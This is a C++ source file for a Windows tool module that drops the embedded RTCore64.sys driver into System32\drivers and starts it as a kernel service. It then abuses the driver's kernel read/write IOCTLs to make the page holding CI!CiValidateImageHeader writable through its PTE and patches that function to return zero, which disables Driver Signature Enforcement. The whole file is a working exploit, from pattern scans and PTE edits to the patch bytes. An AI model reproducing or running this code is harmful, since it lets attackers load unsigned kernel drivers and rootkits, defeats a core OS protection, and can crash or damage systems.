#include "driver_module.h"
#include "resource.h"

#include <iostream>
#include <conio.h>
#include <winternl.h>
#include <ntstatus.h>
#pragma comment(lib, "ntdll.lib")

using namespace std;

// ---- IOCTL and request structs (from example.cpp) ----

#define IOCTL_KERNEL_WRITE 0x8000204c
#define IOCTL_KERNEL_READ  0x80002048

#pragma pack(push, 1)
struct KernelWriteRequest {
    ULONG_PTR Unknown1;
    PVOID      BaseAddress;
    DWORD      Reserved1;
    DWORD      Offset;
    DWORD      WriteSize;
    ULONG      WriteValue;
    DWORD      Reserved2[4];
};
#pragma pack(pop)

#pragma pack(push, 1)
struct KernelReadRequest {
    BYTE      Unknown1[8];
    LONGLONG  BaseAddress;
    DWORD     Reserved1;
    DWORD     Offset;
    DWORD     ReadSize;
    DWORD     ReadValue;
    BYTE      Reserved2[16];
};
#pragma pack(pop)

// ---- NtQuerySystemInformation types ----

typedef struct _SystemModuleInfo {
    ULONG_PTR Reserved1[2];
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    USHORT    LoadOrderIndex;
    USHORT    InitOrderIndex;
    USHORT    LoadCount;
    USHORT    OffsetToFileName;
    UCHAR     FullPathName[256];
} SystemModuleInfo;

typedef struct _SystemModules {
    ULONG          ModulesCount;
    SystemModuleInfo Modules[1];
} SystemModules;

// ======== Module interface ========

vector<string> DriverModule::getCommands() const {
    return { "driver" };
}

void DriverModule::shutdown() {
    if (m_deviceOpen) {
        CloseHandle(m_device);
        m_device = nullptr;
        m_deviceOpen = false;
        system("sc stop RTCore >nul 2>&1");
        system("sc delete RTCore >nul 2>&1");
    }
    if (m_kernelImageBase) {
        VirtualFree(m_kernelImageBase, 0, MEM_RELEASE);
        m_kernelImageBase = nullptr;
    }
    if (m_ciImageBase) {
        VirtualFree(m_ciImageBase, 0, MEM_RELEASE);
        m_ciImageBase = nullptr;
    }
}

bool DriverModule::execute(const string& cmd, const vector<string>& args) {
    if (cmd == "driver") {
        showMethodMenu();
        return true;
    }
    return false;
}

// ======== Method menu ========

static void setCursorPos(int x, int y) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD coord = { (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(hOut, coord);
}

static int getMenuStartY() {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    return csbi.dwCursorPosition.Y;
}

void DriverModule::showMethodMenu() {
    vector<DriverMethod> methods = {
        { "RTCore64",
          "Kernel R/W via RTCore64.sys -> patch CI!CiValidateImageHeader to bypass DSE" },
    };

    int methodCount = (int)methods.size();
    int selected = 0;

    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    DWORD prevMode;
    GetConsoleMode(hIn, &prevMode);
    SetConsoleMode(hIn, ENABLE_EXTENDED_FLAGS | prevMode);

    cout << "\n";
    int menuStart = getMenuStartY();

    cout << "  \x1b[1;37mDriver Signature Bypass Methods\x1b[0m\n";
    cout << "  \x1b[90m" << string(60, '-') << "\x1b[0m\n";

    int listStart = getMenuStartY();

    cout << "\n  \x1b[90m" << string(60, '-') << "\x1b[0m\n";
    cout << "  \x1b[90m[Up/Down] select  [Enter] execute  [Esc] cancel\x1b[0m\n";

    int descLine = getMenuStartY() + 1;

    auto drawMenu = [&]() {
        int y = listStart;
        for (int i = 0; i < methodCount; ++i) {
            setCursorPos(0, y);
            string prefix = (i == selected) ? "  \x1b[44m\x1b[37m> " : "    ";
            string nameColor = (i == selected) ? "\x1b[44m\x1b[1;37m" : "\x1b[32m";
            string descColor = (i == selected) ? "\x1b[44m\x1b[37m" : "\x1b[90m";
            string suffix = (i == selected) ? " \x1b[0m" : "\x1b[0m";
            cout << prefix << nameColor << methods[i].name << suffix
                 << descColor << "  " << methods[i].desc << "\x1b[0m"
                 << string(40, ' ');
            ++y;
        }
        setCursorPos(0, descLine);
        cout << "  \x1b[96m" << methods[selected].desc << "\x1b[0m" << string(40, ' ');
    };

    drawMenu();

    while (true) {
        int ch = _getch();
        if (ch == 224) {
            ch = _getch();
            if (ch == 72 && selected > 0) {
                selected--;
                drawMenu();
            } else if (ch == 80 && selected < methodCount - 1) {
                selected++;
                drawMenu();
            }
        } else if (ch == 13) {
            break;
        } else if (ch == 27) {
            int y = menuStart;
            for (int i = 0; i < methodCount + 6; ++i) {
                setCursorPos(0, y + i);
                cout << string(80, ' ');
            }
            setCursorPos(0, menuStart);
            cout << "[*] Canceled.\n";
            SetConsoleMode(hIn, prevMode);
            return;
        }
    }

    SetConsoleMode(hIn, prevMode);
    cout << "\n";
    executeMethod(selected);
}

bool DriverModule::executeMethod(int index) {
    switch (index) {
    case 0:
        return methodRTCore64();
    default:
        return false;
    }
}

// ======== PE Helpers ========

BOOL DriverModule::GetNTHeaders(PVOID baseAddr, PIMAGE_NT_HEADERS* ntHeaders) {
    if (!baseAddr || !ntHeaders) return FALSE;
    auto* dos = (PIMAGE_DOS_HEADER)baseAddr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    *ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)baseAddr + dos->e_lfanew);
    if ((*ntHeaders)->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    return TRUE;
}

BOOL DriverModule::GetImageExportDirectory(PVOID baseAddr, PIMAGE_EXPORT_DIRECTORY* exportDir) {
    if (!baseAddr || !exportDir) return FALSE;
    PIMAGE_NT_HEADERS ntHeaders = nullptr;
    if (!GetNTHeaders(baseAddr, &ntHeaders)) return FALSE;
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return FALSE;
    *exportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)baseAddr
        + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    return TRUE;
}

DWORD_PTR DriverModule::GetFuncRVA(PVOID baseAddr, const char* funcName) {
    PIMAGE_EXPORT_DIRECTORY pExportDir = nullptr;
    if (!GetImageExportDirectory(baseAddr, &pExportDir)) {
        cout << "[-] Failed to get export directory\n";
        return 0;
    }
    auto* funcRVA = (PDWORD)((DWORD_PTR)baseAddr + pExportDir->AddressOfFunctions);
    auto* nameRVA = (PDWORD)((DWORD_PTR)baseAddr + pExportDir->AddressOfNames);
    auto* nameOrd  = (PWORD)((DWORD_PTR)baseAddr + pExportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        if (!strcmp(funcName, (char*)baseAddr + nameRVA[i]))
            return funcRVA[nameOrd[i]];
    }
    cout << "[-] Failed to find export: " << funcName << "\n";
    return 0;
}

// ======== Kernel helpers ========

PVOID DriverModule::GetKernelModuleBase(const char* moduleName, size_t* imageLength) {
    if (!moduleName) return nullptr;

    DWORD len = 0;
    NTSTATUS st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &len);
    if (st != STATUS_INFO_LENGTH_MISMATCH) {
        cout << "[-] Failed to query module info length\n";
        return nullptr;
    }

    auto* mods = (SystemModules*)malloc(len);
    if (!mods) {
        cout << "[-] Failed to allocate module info buffer\n";
        return nullptr;
    }

    st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, mods, len, &len);
    if (st != STATUS_SUCCESS) {
        cout << "[-] Failed to query module info\n";
        free(mods);
        return nullptr;
    }

    PVOID base = nullptr;
    for (DWORD i = 0; i < mods->ModulesCount; i++) {
        auto* name = (PCHAR)(mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName);
        if (!_strnicmp(name, moduleName, strlen(moduleName))) {
            base = mods->Modules[i].ImageBase;
            if (imageLength)
                *imageLength = mods->Modules[i].ImageSize;
            break;
        }
    }

    free(mods);
    if (!base)
        cout << "[-] Module not found: " << moduleName << "\n";
    return base;
}

PVOID DriverModule::SearchPattern(PVOID baseAddr, SIZE_T size, BYTE* pattern, const char* mask) {
    __int64 patLen = strlen(mask);
    for (__int64 i = 0; i <= (__int64)size - patLen; i++) {
        BOOL found = TRUE;
        for (__int64 j = 0; j < patLen; j++) {
            if (mask[j] != '?' && *(BYTE*)((DWORD_PTR)baseAddr + i + j) != pattern[j]) {
                found = FALSE;
                break;
            }
        }
        if (found)
            return (PVOID)((DWORD_PTR)baseAddr + i);
    }
    return nullptr;
}

BOOL DriverModule::KernelReadMemory(PVOID targetAddr, PBYTE buffer, size_t size) {
    if (!m_deviceOpen) return FALSE;
    for (size_t i = 0; i < size; i++) {
        KernelReadRequest req = {};
        req.BaseAddress = (DWORD64)((PBYTE)targetAddr + i);
        req.ReadSize = 1;
        DWORD ret = 0;
        if (!DeviceIoControl(m_device, IOCTL_KERNEL_READ, &req, 0x30, &req, 0x30, &ret, nullptr)) {
            cout << "[-] Kernel read failed at 0x" << hex << (DWORD_PTR)targetAddr + i << dec << "\n";
            return FALSE;
        }
        buffer[i] = req.ReadValue & 0xFF;
    }
    return TRUE;
}

BOOL DriverModule::KernelWriteMemory(PVOID targetAddr, PBYTE buffer, size_t size) {
    if (!m_deviceOpen) return FALSE;
    for (size_t i = 0; i < size; i++) {
        KernelWriteRequest req = {};
        req.BaseAddress = (PBYTE)targetAddr + i;
        req.WriteSize = 1;
        req.WriteValue = buffer[i];
        DWORD ret = 0;
        if (!DeviceIoControl(m_device, IOCTL_KERNEL_WRITE, &req, 0x30, nullptr, 0, &ret, nullptr))
            return FALSE;
    }
    return TRUE;
}

// ======== Local image mapping ========

static BOOL MapLocalImage(const wchar_t* filePath, PVOID* outBase, SIZE_T* outSize) {
    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        cout << "[-] Failed to open file, error: " << err << "\n";
        return FALSE;
    }

    LARGE_INTEGER fs = {};
    GetFileSizeEx(hFile, &fs);
    size_t fileSize = (size_t)fs.QuadPart;
    if (!fileSize) { CloseHandle(hFile); return FALSE; }

    auto* rawBuf = (PBYTE)VirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rawBuf) { CloseHandle(hFile); return FALSE; }

    DWORD read = 0;
    ReadFile(hFile, rawBuf, (DWORD)fileSize, &read, nullptr);
    CloseHandle(hFile);

    PIMAGE_NT_HEADERS nt = nullptr;
    auto* dos = (PIMAGE_DOS_HEADER)rawBuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { VirtualFree(rawBuf, 0, MEM_RELEASE); return FALSE; }
    nt = (PIMAGE_NT_HEADERS)(rawBuf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { VirtualFree(rawBuf, 0, MEM_RELEASE); return FALSE; }

    auto* img = (PBYTE)VirtualAlloc(nullptr, nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!img) { VirtualFree(rawBuf, 0, MEM_RELEASE); return FALSE; }
    RtlSecureZeroMemory(img, nt->OptionalHeader.SizeOfImage);

    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    DWORD headersSize = nt->OptionalHeader.SizeOfHeaders;
    WORD numSections = nt->FileHeader.NumberOfSections;

    memcpy(img, rawBuf, headersSize);

    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (DWORD i = 0; i < numSections; i++) {
        memcpy(img + sec[i].VirtualAddress, rawBuf + sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }

    VirtualFree(rawBuf, 0, MEM_RELEASE);
    *outBase = img;
    *outSize = imgSize;
    return TRUE;
}

// ======== Method 1: RTCore64 ========

bool DriverModule::extractDriver(const wchar_t* destPath) {
    // Check if already exists
    if (GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES) {
        cout << "[+] Driver already exists at target path\n";
        return true;
    }

    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(IDR_RTCORE64_SYS), RT_RCDATA);
    if (!hRes) {
        cout << "[-] Failed to find RTCore64.sys resource\n";
        return false;
    }

    HGLOBAL hGlobal = LoadResource(nullptr, hRes);
    if (!hGlobal) {
        cout << "[-] Failed to load RTCore64.sys resource\n";
        return false;
    }

    DWORD size = SizeofResource(nullptr, hRes);
    LPVOID data = LockResource(hGlobal);
    if (!data || !size) {
        cout << "[-] Failed to lock RTCore64.sys resource\n";
        return false;
    }

    HANDLE hFile = CreateFileW(destPath, GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        cout << "[-] Failed to create driver file, error: " << err << "\n";
        return false;
    }

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, data, size, &written, nullptr);
    CloseHandle(hFile);

    if (!ok || written != size) {
        cout << "[-] Failed to write driver file\n";
        DeleteFileW(destPath);
        return false;
    }

    cout << "[+] Driver extracted to: C:\\Windows\\System32\\drivers\\RTCore64.sys\n";
    return true;
}

bool DriverModule::methodRTCore64() {
    cout << "\n[*] === RTCore64 Kernel R/W DSE Bypass ===\n\n";
    cout << "Link: https://bbs.kanxue.com/thread-290702.htm\n";
    cout << "Note: This method requires administrative privileges.\n";
    cout << "Warning: This method may cause system instability or damage.\n";
    cout << "Use at your own risk.\n\n";
    // Step 1: Get kernel base
    cout << "[*] Step 1: Getting kernel base address...\n";
    size_t kernelSize = 0;
    m_kernelBase = GetKernelModuleBase("ntoskrnl.exe", &kernelSize);
    if (!m_kernelBase) {
        cout << "[-] Failed to get kernel base\n";
        return false;
    }
    cout << "[+] ntoskrnl.exe base: 0x" << hex << (DWORD_PTR)m_kernelBase << dec << "\n";

    // Step 2: Extract and load RTCore64 driver
    cout << "[*] Step 2: Extracting RTCore64.sys...\n";
    const wchar_t* driverPath = L"C:\\Windows\\System32\\drivers\\RTCore64.sys";
    if (!extractDriver(driverPath)) {
        cout << "[-] Failed to extract driver\n";
        return false;
    }

    cout << "[*] Step 3: Initializing RTCore64 service...\n";
    system("sc create RTCore binpath= C:\\Windows\\System32\\drivers\\RTCore64.sys type= Kernel >nul 2>&1");
    system("sc start RTCore >nul 2>&1");

    m_device = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (m_device == INVALID_HANDLE_VALUE) {
        cout << "[-] Failed to open RTCore64 device. Is RTCore64.sys installed?\n";
        m_device = nullptr;
        return false;
    }
    m_deviceOpen = true;
    cout << "[+] RTCore64 device opened\n";

    // Step 4: Map ntoskrnl.exe locally
    cout << "[*] Step 4: Mapping ntoskrnl.exe locally...\n";
    if (!MapLocalImage(L"C:\\Windows\\System32\\ntoskrnl.exe", &m_kernelImageBase, &m_kernelImageSize)) {
        cout << "[-] Failed to map kernel image\n";
        return false;
    }
    cout << "[+] Kernel image mapped at 0x" << hex << (DWORD_PTR)m_kernelImageBase << dec << "\n";

    // Step 4: Get .text section base
    cout << "[*] Step 4: Finding .text section...\n";
    {
        PIMAGE_NT_HEADERS nt = nullptr;
        GetNTHeaders(m_kernelImageBase, &nt);
        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)sec[i].Name, ".text") == 0) {
                m_kernelImageExecBase = (PBYTE)m_kernelImageBase + sec[i].VirtualAddress;
                m_kernelImageExecSize = sec[i].SizeOfRawData;
                break;
            }
        }
    }
    cout << "[+] .text: 0x" << hex << (DWORD_PTR)m_kernelImageExecBase
         << " size: 0x" << m_kernelImageExecSize << dec << "\n";

    // Step 5: Find MiGetPteAddress
    cout << "[*] Step 5: Finding MiGetPteAddress...\n";
    BYTE miPat[] = "\x48\xc1\xe9\x09\x48\xb8\xf8\xff\xff\xff\x7f\x00\x00\x00\x48\x23\xc8\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\x48\x03\xc1\xc3";
    char miMask[] = "xxxxxxxxxxxxxxxxxxxxxxx????xxxx";

    auto* miGetPteAddrLocal = (PBYTE)SearchPattern(m_kernelImageExecBase, m_kernelImageExecSize, miPat, miMask);
    if (!miGetPteAddrLocal) {
        cout << "[-] MiGetPteAddress pattern not found\n";
        return false;
    }
    DWORD_PTR miRva = (DWORD_PTR)miGetPteAddrLocal - (DWORD_PTR)m_kernelImageBase;
    PVOID miGetPteAddr = (PBYTE)m_kernelBase + miRva;
    cout << "[+] MiGetPteAddress: 0x" << hex << (DWORD_PTR)miGetPteAddr << dec << "\n";

    // Read PTE base from MiGetPteAddress function body
    DWORD64 pteBase = 0;
    KernelReadMemory((PBYTE)miGetPteAddr + 19, (PBYTE)&pteBase, sizeof(pteBase));
    BYTE uValA = *(BYTE*)((DWORD64)m_kernelImageBase + miRva + 0x03);
    DWORD64 uValB = *(DWORD64*)((DWORD64)m_kernelImageBase + miRva + 0x06);
    cout << "[+] PTE base: 0x" << hex << pteBase
         << "  uValA: 0x" << (DWORD)uValA
         << "  uValB: 0x" << uValB << dec << "\n";

    // Step 6: Get CI base and map ci.dll locally
    cout << "[*] Step 6: Getting CI module base...\n";
    m_ciBase = GetKernelModuleBase("ci.dll", nullptr);
    if (!m_ciBase) {
        cout << "[-] Failed to get ci.dll base\n";
        return false;
    }
    cout << "[+] ci.dll base: 0x" << hex << (DWORD_PTR)m_ciBase << dec << "\n";

    cout << "[*] Step 7: Mapping ci.dll locally...\n";
    if (!MapLocalImage(L"C:\\Windows\\System32\\ci.dll", &m_ciImageBase, &m_ciImageSize)) {
        cout << "[-] Failed to map CI image\n";
        return false;
    }
    cout << "[+] CI image mapped at 0x" << hex << (DWORD_PTR)m_ciImageBase << dec << "\n";

    // Step 7: Find CiValidateImageHeader
    cout << "[*] Step 8: Finding CiValidateImageHeader...\n";

    // Find CiInitialize first
    DWORD_PTR ciInitRva = GetFuncRVA(m_ciImageBase, "CiInitialize");
    if (!ciInitRva) return false;
    auto* pCiInit = (PBYTE)m_ciImageBase + ciInitRva;
    cout << "[+] CI!CiInitialize RVA: 0x" << hex << ciInitRva << dec << "\n";

    // Search for CipInitialize call pattern
    BYTE cipPat[] = "\x48\x8b\xd6\x8b\xcd";
    char cipMask[] = "xxxxx";
    auto* pCipInit = (PBYTE)SearchPattern(pCiInit, 0x1000, cipPat, cipMask);
    if (!pCipInit) {
        cout << "[-] CipInitialize pattern not found\n";
        return false;
    }
    pCipInit += 5;
    INT32 off = *(INT32*)(pCipInit + 1);
    pCipInit += 5 + off;
    cout << "[+] CI!CipInitialize RVA: 0x" << hex << ((DWORD_PTR)pCipInit - (DWORD_PTR)m_ciImageBase) << dec << "\n";

    // Search for CiValidateImageHeader reference
    BYTE cviPat[] = "\x48\x8d\x05\x00\x00\x00\x00";
    char cviMask[] = "xxx??xx";
    auto* uRef = (PBYTE)SearchPattern(pCipInit, 0x2000, cviPat, cviMask);
    if (!uRef) {
        cout << "[-] CiValidateImageHeader reference not found\n";
        return false;
    }
    INT32 off2 = *(INT32*)(uRef + 3);
    DWORD_PTR cviRva = ((DWORD_PTR)uRef + 7 + off2) - (DWORD_PTR)m_ciImageBase;
    PVOID pCiValidateImageHeader = (PBYTE)m_ciBase + cviRva;
    cout << "[+] CI!CiValidateImageHeader: 0x" << hex << (DWORD_PTR)pCiValidateImageHeader << dec << "\n";

    // Step 8: Calculate PTE and make writable
    cout << "[*] Step 9: Modifying PTE to make page writable...\n";
    ULONGLONG addr = (ULONGLONG)pCiValidateImageHeader;
    auto* pte = (ULONG64*)((addr >> uValA & uValB) + pteBase);
    cout << "[+] PTE address: 0x" << hex << (DWORD_PTR)pte << dec << "\n";

    DWORD64 pteVal = 0;
    KernelReadMemory(pte, (PBYTE)&pteVal, sizeof(pteVal));
    cout << "[+] Original PTE value: 0x" << hex << pteVal << dec << "\n";

    DWORD64 pteOld = pteVal;
    pteVal |= 2; // make writable
    KernelWriteMemory(pte, (PBYTE)&pteVal, sizeof(pteVal));
    cout << "[+] PTE modified (added write bit)\n";

    // Step 9: Patch CiValidateImageHeader -> xor rax,rax; ret
    cout << "[*] Step 10: Patching CiValidateImageHeader...\n";
    BYTE origBytes[4] = {};
    KernelReadMemory(pCiValidateImageHeader, origBytes, sizeof(origBytes));
    cout << "[+] Original bytes: "
         << hex << (DWORD)origBytes[0] << " " << (DWORD)origBytes[1] << " "
         << (DWORD)origBytes[2] << " " << (DWORD)origBytes[3] << dec << "\n";

    // xor eax, eax; ret  (x64)
    BYTE patch[] = "\x48\x31\xc0\xc3";
    KernelWriteMemory(pCiValidateImageHeader, patch, sizeof(patch) - 1);
    cout << "[+] CiValidateImageHeader patched: xor rax,rax; ret\n";
    cout << "[+] DSE is now DISABLED. You can load unsigned drivers.\n\n";

    cout << "  \x1b[1;33mPress any key to restore original state and cleanup...\x1b[0m\n";
    _getch();

    // Restore
    cout << "\n[*] Restoring CiValidateImageHeader...\n";
    KernelWriteMemory(pCiValidateImageHeader, origBytes, sizeof(origBytes));
    cout << "[+] Original bytes restored\n";

    cout << "[*] Restoring PTE...\n";
    KernelWriteMemory(pte, (PBYTE)&pteOld, sizeof(pteOld));
    cout << "[+] PTE restored\n";

    // Cleanup
    shutdown();
    cout << "[+] Cleanup complete. DSE re-enabled.\n";
    return true;
}